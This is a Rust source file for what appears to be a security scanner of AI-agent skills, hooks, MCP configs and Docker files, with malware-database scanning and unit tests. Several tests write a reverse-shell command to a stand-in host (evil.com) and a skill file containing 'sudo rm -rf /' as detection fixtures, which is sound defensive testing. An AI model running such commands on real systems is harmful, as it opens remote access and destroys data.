use crate::{
    Cli, CommandScanner, Confidence, Config, CustomRuleLoader, Deobfuscator, DependencyScanner,
    DockerScanner, DynamicRule, Finding, HookScanner, IgnoreFilter, JsonReporter, MalwareDatabase,
    McpScanner, OutputFormat, PluginScanner, Reporter, RiskScore, RuleSeverity, RulesDirScanner,
    SarifReporter, ScanResult, ScanType, Scanner, Severity, SkillScanner, SubagentScanner, Summary,
    TerminalReporter,
};
use chrono::Utc;
use std::fs;
use std::path::Path;
use walkdir::WalkDir;

/// Effective scan configuration after merging CLI and config file
#[derive(Debug, Clone)]
pub struct EffectiveConfig {
    pub format: OutputFormat,
    pub strict: bool,
    pub warn_only: bool,
    pub min_severity: Option<Severity>,
    pub min_rule_severity: Option<RuleSeverity>,
    pub scan_type: ScanType,
    pub recursive: bool,
    pub ci: bool,
    pub verbose: bool,
    pub min_confidence: Confidence,
    pub skip_comments: bool,
    pub fix_hint: bool,
    pub no_malware_scan: bool,
    pub deep_scan: bool,
    pub watch: bool,
    pub output: Option<String>,
    pub fix: bool,
    pub fix_dry_run: bool,
    pub malware_db: Option<String>,
    pub custom_rules: Option<String>,
}

impl EffectiveConfig {
    /// Merge CLI options with config file settings
    /// Boolean flags: CLI OR config (either can enable)
    /// Enum options: config provides defaults, CLI always takes precedence
    /// Path options: CLI takes precedence, fallback to config
    pub fn from_cli_and_config(cli: &Cli, config: &Config) -> Self {
        // Parse format from config if available
        let format = parse_output_format(config.scan.format.as_deref()).unwrap_or(cli.format);

        // Parse scan_type from config if available
        let scan_type = parse_scan_type(config.scan.scan_type.as_deref()).unwrap_or(cli.scan_type);

        // Parse min_confidence from config if available
        let min_confidence =
            parse_confidence(config.scan.min_confidence.as_deref()).unwrap_or(cli.min_confidence);

        // Path options: CLI takes precedence, fallback to config
        let malware_db = cli
            .malware_db
            .as_ref()
            .map(|p| p.display().to_string())
            .or_else(|| config.scan.malware_db.clone());

        let custom_rules = cli
            .custom_rules
            .as_ref()
            .map(|p| p.display().to_string())
            .or_else(|| config.scan.custom_rules.clone());

        let output = cli
            .output
            .as_ref()
            .map(|p| p.display().to_string())
            .or_else(|| config.scan.output.clone());

        Self {
            format,
            // Boolean flags: OR operation (config can enable, CLI can enable)
            strict: cli.strict || config.scan.strict,
            warn_only: cli.warn_only,
            min_severity: cli.min_severity,
            min_rule_severity: cli.min_rule_severity,
            scan_type,
            recursive: cli.recursive || config.scan.recursive,
            ci: cli.ci || config.scan.ci,
            verbose: cli.verbose || config.scan.verbose,
            min_confidence,
            skip_comments: cli.skip_comments || config.scan.skip_comments,
            fix_hint: cli.fix_hint || config.scan.fix_hint,
            no_malware_scan: cli.no_malware_scan || config.scan.no_malware_scan,
            deep_scan: cli.deep_scan || config.scan.deep_scan,
            watch: cli.watch || config.scan.watch,
            fix: cli.fix || config.scan.fix,
            fix_dry_run: cli.fix_dry_run || config.scan.fix_dry_run,
            output,
            malware_db,
            custom_rules,
        }
    }
}

fn parse_output_format(s: Option<&str>) -> Option<OutputFormat> {
    match s?.to_lowercase().as_str() {
        "terminal" => Some(OutputFormat::Terminal),
        "json" => Some(OutputFormat::Json),
        "sarif" => Some(OutputFormat::Sarif),
        "html" => Some(OutputFormat::Html),
        _ => None,
    }
}

fn parse_scan_type(s: Option<&str>) -> Option<ScanType> {
    match s?.to_lowercase().as_str() {
        "skill" => Some(ScanType::Skill),
        "hook" => Some(ScanType::Hook),
        "mcp" => Some(ScanType::Mcp),
        "command" => Some(ScanType::Command),
        "rules" => Some(ScanType::Rules),
        "docker" => Some(ScanType::Docker),
        "dependency" => Some(ScanType::Dependency),
        "subagent" => Some(ScanType::Subagent),
        "plugin" => Some(ScanType::Plugin),
        _ => None,
    }
}

fn parse_confidence(s: Option<&str>) -> Option<Confidence> {
    match s?.to_lowercase().as_str() {
        "tentative" => Some(Confidence::Tentative),
        "firm" => Some(Confidence::Firm),
        "certain" => Some(Confidence::Certain),
        _ => None,
    }
}

/// Load custom rules from effective config (CLI or config file)
fn load_custom_rules_from_effective(effective: &EffectiveConfig) -> Vec<DynamicRule> {
    match &effective.custom_rules {
        Some(path_str) => {
            let path = Path::new(path_str);
            match CustomRuleLoader::load_from_file(path) {
                Ok(rules) => {
                    if !rules.is_empty() {
                        eprintln!("Loaded {} custom rule(s) from {}", rules.len(), path_str);
                    }
                    rules
                }
                Err(e) => {
                    eprintln!("Warning: Failed to load custom rules: {}", e);
                    Vec::new()
                }
            }
        }
        None => Vec::new(),
    }
}

pub fn run_scan(cli: &Cli) -> Option<ScanResult> {
    run_scan_internal(cli, None)
}

/// Run scan with pre-loaded config (for testing)
pub fn run_scan_with_config(cli: &Cli, config: Config) -> Option<ScanResult> {
    run_scan_internal(cli, Some(config))
}

fn run_scan_internal(cli: &Cli, preloaded_config: Option<Config>) -> Option<ScanResult> {
    let mut all_findings = Vec::new();
    let mut targets = Vec::new();

    // Determine project root for config loading
    let project_root = cli.paths.first().and_then(|p| {
        if p.is_dir() {
            Some(p.as_path())
        } else {
            p.parent()
        }
    });

    // Load config from project root or global config (or use preloaded)
    let config = preloaded_config.unwrap_or_else(|| Config::load(project_root));

    // Load profile if specified
    let mut config = config;
    if let Some(ref profile_name) = cli.profile {
        match crate::Profile::load(profile_name) {
            Ok(profile) => {
                profile.apply_to_config(&mut config.scan);
                eprintln!("Using profile: {}", profile_name);
            }
            Err(e) => {
                eprintln!("Warning: Failed to load profile '{}': {}", profile_name, e);
            }
        }
    }

    // Merge CLI options with config file settings
    let effective = EffectiveConfig::from_cli_and_config(cli, &config);

    // Load custom rules: merge effective config rules with config file inline rules
    let mut custom_rules = load_custom_rules_from_effective(&effective);

    // Add rules from config file (inline rules section)
    if !config.rules.is_empty() {
        match CustomRuleLoader::convert_yaml_rules(config.rules.clone()) {
            Ok(config_rules) => {
                let config_rules_count = config_rules.len();
                custom_rules.extend(config_rules);
                if config_rules_count > 0 {
                    eprintln!(
                        "Loaded {} custom rule(s) from config file",
                        config_rules_count
                    );
                }
            }
            Err(e) => {
                eprintln!("Warning: Failed to load rules from config file: {}", e);
            }
        }
    }

    // Load malware database if enabled (using effective config)
    let malware_db = if !effective.no_malware_scan {
        let mut db = match &effective.malware_db {
            Some(path_str) => {
                let path = Path::new(path_str);
                match MalwareDatabase::from_file(path) {
                    Ok(db) => db,
                    Err(e) => {
                        eprintln!("Warning: Failed to load custom malware database: {}", e);
                        eprintln!("Falling back to built-in database.");
                        MalwareDatabase::default()
                    }
                }
            }
            None => MalwareDatabase::default(),
        };

        // Add malware signatures from config file (inline signatures section)
        if !config.malware_signatures.is_empty() {
            let sig_count = config.malware_signatures.len();
            if let Err(e) = db.add_signatures(config.malware_signatures.clone()) {
                eprintln!(
                    "Warning: Failed to load malware signatures from config file: {}",
                    e
                );
            } else {
                eprintln!("Loaded {} malware signature(s) from config file", sig_count);
            }
        }

        Some(db)
    } else {
        None
    };

    // Create ignore filter from config, then apply CLI overrides
    let create_ignore_filter = |path: &Path| {
        let mut filter = IgnoreFilter::from_config(path, &config.ignore);
        // CLI flags override config settings if explicitly set
        if cli.include_tests {
            filter = filter.with_include_tests(true);
        }
        if cli.include_node_modules {
            filter = filter.with_include_node_modules(true);
        }
        if cli.include_vendor {
            filter = filter.with_include_vendor(true);
        }
        filter
    };

    for path in &cli.paths {
        // Use effective scan_type from merged config
        let result = match effective.scan_type {
            ScanType::Skill => {
                let ignore_filter = create_ignore_filter(path);
                let scanner = SkillScanner::new()
                    .with_ignore_filter(ignore_filter)
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Hook => {
                let scanner = HookScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Mcp => {
                let scanner = McpScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Command => {
                let scanner = CommandScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Rules => {
                let scanner = RulesDirScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Docker => {
                let ignore_filter = create_ignore_filter(path);
                let scanner = DockerScanner::new()
                    .with_ignore_filter(ignore_filter)
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Dependency => {
                let scanner = DependencyScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Subagent => {
                let scanner = SubagentScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Plugin => {
                let scanner = PluginScanner::new()
                    .with_skip_comments(effective.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
        };

        match result {
            Ok(findings) => {
                all_findings.extend(findings);
                targets.push(path.display().to_string());
            }
            Err(e) => {
                eprintln!("Error scanning {}: {}", path.display(), e);
                return None;
            }
        }

        // Run malware database scan on files
        if let Some(ref db) = malware_db {
            let malware_findings = scan_path_with_malware_db(path, db);
            all_findings.extend(malware_findings);
        }

        // Run deep scan with deobfuscation if enabled
        if effective.deep_scan {
            let deep_findings = run_deep_scan(path);
            all_findings.extend(deep_findings);
        }
    }

    // Filter findings by minimum confidence level (using effective config) and disabled rules
    // Also apply RuleSeverity based on config
    let mut filtered_findings: Vec<_> = all_findings
        .into_iter()
        .filter(|f| f.confidence >= effective.min_confidence)
        // Filter out disabled rules (from disabled_rules AND severity.ignore)
        .filter(|f| !config.is_rule_disabled(&f.id))
        // Filter by min_severity if specified
        .filter(|f| {
            if let Some(min_sev) = effective.min_severity {
                f.severity >= min_sev
            } else {
                true
            }
        })
        .collect();

    // Apply RuleSeverity to each finding
    for finding in &mut filtered_findings {
        let rule_severity = if effective.warn_only {
            // --warn-only: treat all findings as warnings
            RuleSeverity::Warn
        } else if let Some(severity) = config.get_rule_severity(&finding.id) {
            severity
        } else {
            RuleSeverity::Error
        };
        finding.rule_severity = Some(rule_severity);
    }

    let summary = Summary::from_findings_with_rule_severity(&filtered_findings);
    let risk_score = RiskScore::from_findings(&filtered_findings);
    Some(ScanResult {
        version: env!("CARGO_PKG_VERSION").to_string(),
        scanned_at: Utc::now().to_rfc3339(),
        target: targets.join(", "),
        summary,
        findings: filtered_findings,
        risk_score: Some(risk_score),
    })
}

/// Run deep scan with deobfuscation on a path
fn run_deep_scan(path: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let deobfuscator = Deobfuscator::new();

    if path.is_file() {
        if is_text_file(path)
            && let Ok(content) = fs::read_to_string(path)
        {
            findings.extend(deobfuscator.deep_scan(&content, &path.display().to_string()));
        }
    } else if path.is_dir() {
        for entry in WalkDir::new(path)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let file_path = entry.path();
            if is_text_file(file_path)
                && let Ok(content) = fs::read_to_string(file_path)
            {
                findings.extend(deobfuscator.deep_scan(&content, &file_path.display().to_string()));
            }
        }
    }

    findings
}

pub fn scan_path_with_malware_db(path: &Path, db: &MalwareDatabase) -> Vec<Finding> {
    let mut findings = Vec::new();

    if path.is_file() {
        // Skip config files
        if !is_config_file(path)
            && let Ok(content) = fs::read_to_string(path)
        {
            findings.extend(db.scan_content(&content, &path.display().to_string()));
        }
    } else if path.is_dir() {
        for entry in WalkDir::new(path)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let file_path = entry.path();
            // Skip config files and binary files
            if !is_config_file(file_path)
                && is_text_file(file_path)
                && let Ok(content) = fs::read_to_string(file_path)
            {
                findings.extend(db.scan_content(&content, &file_path.display().to_string()));
            }
        }
    }

    findings
}

/// Check if a file is a cc-audit configuration file
fn is_config_file(path: &Path) -> bool {
    const CONFIG_FILES: &[&str] = &[
        ".cc-audit.yaml",
        ".cc-audit.yml",
        ".cc-audit.json",
        ".cc-audit.toml",
        ".cc-auditignore",
    ];

    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| CONFIG_FILES.contains(&name))
}

/// Check if a file is a text file using the default configuration
pub fn is_text_file(path: &Path) -> bool {
    static DEFAULT_CONFIG: std::sync::LazyLock<crate::config::TextFilesConfig> =
        std::sync::LazyLock::new(crate::config::TextFilesConfig::default);

    is_text_file_with_config(path, &DEFAULT_CONFIG)
}

/// Check if a file is a text file using the provided configuration
pub fn is_text_file_with_config(path: &Path, config: &crate::config::TextFilesConfig) -> bool {
    // First try the config-based check
    if config.is_text_file(path) {
        return true;
    }

    // Additional checks for common patterns not easily captured in config
    if let Some(name) = path.file_name() {
        let name_str = name.to_string_lossy();
        let name_lower = name_str.to_lowercase();

        // Dotfiles are often text configuration files
        if name_str.starts_with('.') {
            return true;
        }

        // Files ending with "rc" are often configuration files
        if name_lower.ends_with("rc") {
            return true;
        }
    }

    false
}

pub fn format_result(cli: &Cli, result: &ScanResult) -> String {
    // Determine project root for config loading
    let project_root = cli.paths.first().and_then(|p| {
        if p.is_dir() {
            Some(p.as_path())
        } else {
            p.parent()
        }
    });

    // Load config and merge with CLI
    let config = Config::load(project_root);
    let effective = EffectiveConfig::from_cli_and_config(cli, &config);

    format_result_with_config(&effective, result)
}

/// Format result using effective config (avoids reloading config)
pub fn format_result_with_config(effective: &EffectiveConfig, result: &ScanResult) -> String {
    match effective.format {
        OutputFormat::Terminal => {
            let reporter = TerminalReporter::new(effective.strict, effective.verbose)
                .with_fix_hints(effective.fix_hint);
            reporter.report(result)
        }
        OutputFormat::Json => {
            let reporter = JsonReporter::new();
            reporter.report(result)
        }
        OutputFormat::Sarif => {
            let reporter = SarifReporter::new();
            reporter.report(result)
        }
        OutputFormat::Html => {
            let reporter = crate::reporter::html::HtmlReporter::new();
            reporter.report(result)
        }
    }
}

/// Result of running in watch mode
#[derive(Debug)]
pub enum WatchModeResult {
    /// Watcher was successfully set up, initial scan was done
    Success,
    /// Failed to create watcher
    WatcherCreationFailed(String),
    /// Failed to watch a path
    WatchPathFailed(String, String),
}

/// Set up watch mode and return the result
pub fn setup_watch_mode(cli: &Cli) -> Result<crate::FileWatcher, WatchModeResult> {
    let mut watcher = match crate::FileWatcher::new() {
        Ok(w) => w,
        Err(e) => {
            return Err(WatchModeResult::WatcherCreationFailed(e.to_string()));
        }
    };

    // Watch all paths
    for path in &cli.paths {
        if let Err(e) = watcher.watch(path) {
            return Err(WatchModeResult::WatchPathFailed(
                path.display().to_string(),
                e.to_string(),
            ));
        }
    }

    Ok(watcher)
}

/// Run one iteration of the watch loop
pub fn watch_iteration(cli: &Cli) -> Option<String> {
    run_scan(cli).map(|result| format_result(cli, &result))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;
    use tempfile::TempDir;

    fn create_test_cli(paths: Vec<PathBuf>) -> Cli {
        Cli {
            paths,
            scan_type: ScanType::Skill,
            format: OutputFormat::Terminal,
            strict: false,
            warn_only: false,
            min_severity: None,
            min_rule_severity: None,
            verbose: false,
            recursive: true,
            ci: false,
            include_tests: false,
            include_node_modules: false,
            include_vendor: false,
            min_confidence: crate::Confidence::Tentative,
            watch: false,
            init_hook: false,
            remove_hook: false,
            skip_comments: false,
            fix_hint: false,
            no_malware_scan: false,
            malware_db: None,
            custom_rules: None,
            baseline: false,
            check_drift: false,
            init: false,
            output: None,
            save_baseline: None,
            baseline_file: None,
            compare: None,
            fix: false,
            fix_dry_run: false,
            mcp_server: false,
            deep_scan: false,
            profile: None,
            save_profile: None,
        }
    }

    #[test]
    fn test_is_text_file_by_extension() {
        assert!(is_text_file(Path::new("test.md")));
        assert!(is_text_file(Path::new("test.txt")));
        assert!(is_text_file(Path::new("test.sh")));
        assert!(is_text_file(Path::new("test.py")));
        assert!(is_text_file(Path::new("test.js")));
        assert!(is_text_file(Path::new("test.rs")));
        assert!(is_text_file(Path::new("test.json")));
        assert!(is_text_file(Path::new("test.yaml")));
        assert!(is_text_file(Path::new("test.yml")));
        assert!(is_text_file(Path::new("test.toml")));
        assert!(is_text_file(Path::new("test.xml")));
        assert!(is_text_file(Path::new("test.html")));
        assert!(is_text_file(Path::new("test.css")));
        assert!(is_text_file(Path::new("test.go")));
        assert!(is_text_file(Path::new("test.rb")));
        assert!(is_text_file(Path::new("test.pl")));
        assert!(is_text_file(Path::new("test.php")));
        assert!(is_text_file(Path::new("test.java")));
        assert!(is_text_file(Path::new("test.c")));
        assert!(is_text_file(Path::new("test.cpp")));
        assert!(is_text_file(Path::new("test.h")));
        assert!(is_text_file(Path::new("test.hpp")));
        assert!(is_text_file(Path::new("test.cs")));
        assert!(is_text_file(Path::new("test.env")));
        assert!(is_text_file(Path::new("test.conf")));
        assert!(is_text_file(Path::new("test.cfg")));
        assert!(is_text_file(Path::new("test.ini")));
        assert!(is_text_file(Path::new("test.bash")));
        assert!(is_text_file(Path::new("test.zsh")));
        assert!(is_text_file(Path::new("test.ts")));
    }

    #[test]
    fn test_is_text_file_case_insensitive() {
        assert!(is_text_file(Path::new("test.MD")));
        assert!(is_text_file(Path::new("test.TXT")));
        assert!(is_text_file(Path::new("test.JSON")));
        assert!(is_text_file(Path::new("test.YAML")));
    }

    #[test]
    fn test_is_text_file_by_filename() {
        assert!(is_text_file(Path::new("Dockerfile")));
        assert!(is_text_file(Path::new("dockerfile")));
        assert!(is_text_file(Path::new("Makefile")));
        assert!(is_text_file(Path::new("makefile")));
        assert!(is_text_file(Path::new(".gitignore")));
        assert!(is_text_file(Path::new(".bashrc")));
        assert!(is_text_file(Path::new(".zshrc")));
        assert!(is_text_file(Path::new(".vimrc")));
    }

    #[test]
    fn test_is_text_file_returns_false_for_binary() {
        assert!(!is_text_file(Path::new("image.png")));
        assert!(!is_text_file(Path::new("binary.exe")));
        assert!(!is_text_file(Path::new("archive.zip")));
        assert!(!is_text_file(Path::new("document.pdf")));
        assert!(!is_text_file(Path::new("audio.mp3")));
        assert!(!is_text_file(Path::new("video.mp4")));
    }

    #[test]
    fn test_is_text_file_common_text_files() {
        // Common text files like README and LICENSE are recognized
        // The config-based is_text_file now correctly identifies these
        assert!(is_text_file(Path::new("README")));
        assert!(is_text_file(Path::new("LICENSE")));
    }

    #[test]
    fn test_is_text_file_unknown_no_extension() {
        // Files without extension and not matching known text file names
        assert!(!is_text_file(Path::new("unknownfile123")));
    }

    #[test]
    fn test_scan_path_with_malware_db_file() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.sh");
        fs::write(&test_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(&test_file, &db);

        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_directory() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("evil.sh");
        fs::write(&test_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let clean_file = temp_dir.path().join("clean.sh");
        fs::write(&clean_file, "echo 'Hello World'").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(temp_dir.path(), &db);

        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_skips_binary() {
        let temp_dir = TempDir::new().unwrap();
        let binary_file = temp_dir.path().join("test.exe");
        fs::write(&binary_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(temp_dir.path(), &db);

        // Binary files should be skipped
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_empty_path() {
        let temp_dir = TempDir::new().unwrap();
        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(temp_dir.path(), &db);

        assert!(findings.is_empty());
    }

    #[test]
    fn test_run_scan_success() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(
            &skill_md,
            r#"---
name: test
allowed-tools: Read
---
# Test Skill
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        assert!(result.summary.passed);
    }

    #[test]
    fn test_run_scan_with_findings() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(
            &skill_md,
            r#"---
name: evil
allowed-tools: "*"
---
# Evil Skill

sudo rm -rf /
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        assert!(!result.summary.passed);
    }

    #[test]
    fn test_run_scan_nonexistent_path() {
        let cli = create_test_cli(vec![PathBuf::from("/nonexistent/path/12345")]);
        let result = run_scan(&cli);

        assert!(result.is_none());
    }

    #[test]
    fn test_run_scan_hook_type() {
        let temp_dir = TempDir::new().unwrap();
        let settings_dir = temp_dir.path().join(".claude");
        fs::create_dir_all(&settings_dir).unwrap();
        let settings_file = settings_dir.join("settings.json");
        fs::write(
            &settings_file,
            r#"{"hooks": {"PreToolUse": [{"matcher": "*", "hooks": [{"type": "command", "command": "echo test"}]}]}}"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Hook;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_mcp_type() {
        let temp_dir = TempDir::new().unwrap();
        let mcp_file = temp_dir.path().join(".mcp.json");
        fs::write(
            &mcp_file,
            r#"{"mcpServers": {"test": {"command": "echo", "args": ["hello"]}}}"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Mcp;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_command_type() {
        let temp_dir = TempDir::new().unwrap();
        let commands_dir = temp_dir.path().join(".claude").join("commands");
        fs::create_dir_all(&commands_dir).unwrap();
        let cmd_file = commands_dir.join("test.md");
        fs::write(&cmd_file, "# Test command\necho hello").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Command;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_rules_type() {
        let temp_dir = TempDir::new().unwrap();
        let rules_dir = temp_dir.path().join(".cursor").join("rules");
        fs::create_dir_all(&rules_dir).unwrap();
        let rule_file = rules_dir.join("test.md");
        fs::write(&rule_file, "# Test rule\nBe helpful").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Rules;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_docker_type() {
        let temp_dir = TempDir::new().unwrap();
        let dockerfile = temp_dir.path().join("Dockerfile");
        fs::write(&dockerfile, "FROM alpine:latest\nRUN echo hello").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Docker;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_malware_db_disabled() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.no_malware_scan = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_custom_malware_db() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create a custom malware DB file
        let malware_db_file = temp_dir.path().join("custom-malware.json");
        fs::write(
            &malware_db_file,
            r#"{
            "version": "1.0.0",
            "updated_at": "2026-01-25",
            "signatures": []
        }"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.malware_db = Some(malware_db_file);
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_malware_db() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create an invalid malware DB file
        let malware_db_file = temp_dir.path().join("invalid-malware.json");
        fs::write(&malware_db_file, "not valid json").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.malware_db = Some(malware_db_file);
        let result = run_scan(&cli);

        // Should fallback to builtin database
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_multiple_paths() {
        let temp_dir1 = TempDir::new().unwrap();
        let skill_md1 = temp_dir1.path().join("SKILL.md");
        fs::write(&skill_md1, "# Test1\n").unwrap();

        let temp_dir2 = TempDir::new().unwrap();
        let skill_md2 = temp_dir2.path().join("SKILL.md");
        fs::write(&skill_md2, "# Test2\n").unwrap();

        let cli = create_test_cli(vec![
            temp_dir1.path().to_path_buf(),
            temp_dir2.path().to_path_buf(),
        ]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        assert!(result.target.contains(", "));
    }

    #[test]
    fn test_run_scan_with_confidence_filter() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.min_confidence = crate::Confidence::Certain;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_format_result_terminal() {
        let temp_dir = TempDir::new().unwrap();
        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("PASS"));
    }

    #[test]
    fn test_format_result_json() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.format = OutputFormat::Json;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("\"version\""));
        assert!(output.contains("\"passed\": true") || output.contains("\"passed\":true"));
    }

    #[test]
    fn test_format_result_sarif() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.format = OutputFormat::Sarif;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("\"$schema\""));
        assert!(output.contains("2.1.0"));
    }

    #[test]
    fn test_format_result_with_fix_hints() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.fix_hint = true;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let _output = format_result(&cli, &result);
        // Fix hints only show when there are findings with fix_hint
    }

    #[test]
    fn test_format_result_verbose() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.verbose = true;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let _output = format_result(&cli, &result);
    }

    #[test]
    fn test_format_result_strict() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.strict = true;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let _output = format_result(&cli, &result);
    }

    #[test]
    fn test_setup_watch_mode_success() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = setup_watch_mode(&cli);

        assert!(result.is_ok());
    }

    #[test]
    fn test_setup_watch_mode_nonexistent_path() {
        let cli = create_test_cli(vec![PathBuf::from("/nonexistent/path/for/watch/12345")]);
        let result = setup_watch_mode(&cli);

        assert!(result.is_err());
        if let Err(WatchModeResult::WatchPathFailed(path, _)) = result {
            assert!(path.contains("nonexistent"));
        } else {
            panic!("Expected WatchPathFailed error");
        }
    }

    #[test]
    fn test_setup_watch_mode_multiple_paths() {
        let temp_dir1 = TempDir::new().unwrap();
        let temp_dir2 = TempDir::new().unwrap();
        fs::write(temp_dir1.path().join("SKILL.md"), "# Test1\n").unwrap();
        fs::write(temp_dir2.path().join("SKILL.md"), "# Test2\n").unwrap();

